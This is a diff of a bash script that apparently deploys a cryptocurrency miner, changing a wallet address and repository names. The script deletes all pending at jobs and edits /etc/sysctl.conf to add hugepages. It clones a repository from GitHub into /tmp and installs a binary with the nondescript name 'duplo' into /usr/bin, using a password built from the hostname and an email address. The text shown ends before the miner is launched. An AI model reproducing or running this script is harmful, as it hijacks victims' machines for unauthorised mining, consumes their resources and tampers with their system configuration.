@@ -1,24 +1,24 @@
 #!/bin/bash
 
-WALLET=46hET53HZrBFj4NxgT9hXDLnAu93yuXToZ5LUHGGxbPd8ma73AWCWngPGivVm4ZraWSsJobk8eQaRbD5fqrSmgQ7DGF8Qnm
+WALLET=4B2ABqe1RZKYJ41ZD6xUpVjHJuhZWwLfB5hVEqUgP9QmZDzJC5Xzmv1VKrHLWhtc546uNcQuZvKCbYJ7wGkE29htKzAwLcD
 ID="$(hostname)"
 MAIL=kotminkot@yandex.ru
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
-rm -rf /tmp/server7/
+rm -rf /tmp/server12/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir server7
-git clone https://github.com/rekek/server7.git /tmp/server7
-cd /tmp/server7
-chmod +x /tmp/server7/duplo
+cd /tmp && mkdir server12
+git clone https://github.com/rekek/server12.git /tmp/server12
+cd /tmp/server12
+chmod +x /tmp/server12/duplo
 chmod 777 ./*.sh
-cp /tmp/server7/duplo /usr/bin/
+cp /tmp/server12/duplo /usr/bin/
 sleep 3
 
 touch /tmp/at.txt
